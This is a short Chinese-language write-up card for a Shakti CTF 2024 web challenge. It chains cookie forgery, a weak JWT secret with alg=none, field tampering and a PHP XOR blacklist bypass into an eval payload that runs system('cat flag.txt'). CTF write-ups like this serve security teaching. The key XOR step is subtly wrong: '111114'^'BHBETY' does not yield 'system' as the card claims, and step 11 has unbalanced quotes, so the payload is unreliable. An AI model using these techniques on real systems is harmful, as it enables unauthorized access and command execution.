---
title: "Shakti CTF (2024) Writeup"
category: web
tags: ["Shakti CTF", "web", "cookie-forge", "command-injection", "jwt-none", "eval-restricted"]
signals: ["Shakti CTF 2024", "cookie-forge", "command-injection", "jwt-none", "eval-restricted", "xor-obfuscation-php", "web_unknown", "Shakti", "CTF", "Cookie", "JWT", "PHP", "admin", "base64"]
difficulty: medium
source: "https://www.ctfiot.com/166696.html"
tools: ["PHP"]
origin: des-import
origin_kind: cards
updated: 2026-10-24
---
# Shakti CTF (2024) Writeup

> 赛事：Shakti CTF 2024 | 方向：web | 难度：medium | 工具：PHP

## 一句话总结

Shakti CTF 2024 混合题：Cookie 伪造 + JWT 爆破 + PHP 异或绕过黑名单。

## 攻击链

1. Cookie 解析 admin=0 → 1 base64 改 admin 标志
2. 路由 / first_num 泄露伪随机种子
3. seed 爆破 1e6-9e6 → second_num
4. JWT secret=222333 HS256 弱密码
5. 算法改 alg=none 绕签名
6. product_id 整数溢出购买 -1
7. checkout cookie shopping_token 含 amount 字段改 1e9
8. PHP preg_match 限制 eval 但可 XOR 字符串拼接
9. 111114" ^ "BHBETY" = "system
10. 111q1411w111" ^ "RPEQWXPVYEIE" = "cat flag.txt
11. 注入 eval("("111114"^"BHBETY")("111q1411w111"^"RPEQWXPVYEIE")")

## 关键 payload

```
eval(("111114"^"BHBETY")("111q1411w111"^"RPEQWXPVYEIE"))
```

## 经验教训

PHP preg_match 黑名单在过滤单字符时常用 XOR/自增绕过。

## 标签

cookie-forge、command-injection、jwt-none、eval-restricted、xor-obfuscation-php

## 参考来源

- https://www.ctfiot.com/166696.html
- 原文件：Shakti_CTF_(2024)_Writeup.full.md
